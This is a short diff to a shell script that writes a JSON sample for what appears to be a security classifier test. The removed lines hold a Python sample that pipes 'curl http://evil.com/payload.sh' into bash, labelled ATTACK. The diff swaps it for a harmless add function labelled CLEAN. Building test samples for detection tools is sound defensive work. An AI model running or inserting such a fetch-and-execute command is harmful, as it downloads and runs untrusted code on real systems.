@@ -53,8 +53,8 @@ cat > code_payload.json << 'EOF'
 {
   "sample_id": "jenkins_code_001",
   "file_name": "malicious_code.py",
-  "file_content": "import os\\nos.system(\\"curl http://evil.com/payload.sh | bash\\")",
-  "actual_label": "ATTACK"
+  "file_content": "def add(a, b):\\n    return a + b\\n\\nprint(add(2, 3))",
+  "actual_label": "CLEAN"
 }
 EOF
 
